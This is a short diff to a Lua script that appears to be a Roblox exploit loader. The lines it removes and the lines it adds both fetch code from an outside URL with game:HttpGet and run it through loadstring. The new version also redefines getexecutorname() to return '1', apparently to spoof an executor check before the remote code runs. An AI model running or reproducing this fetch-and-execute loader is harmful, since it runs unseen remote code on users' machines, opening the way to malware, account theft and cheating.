@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjUzOTRlMDMwLWQwMjEtNDY2Ni05MTQxLWNmOGJmOTE5ZjVjOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
+local l = loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjUzOTRlMDMwLWQwMjEtNDY2Ni05MTQxLWNmOGJmOTE5ZjVjOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"));
+function getexecutorname()
+return "1"
+end
+l()
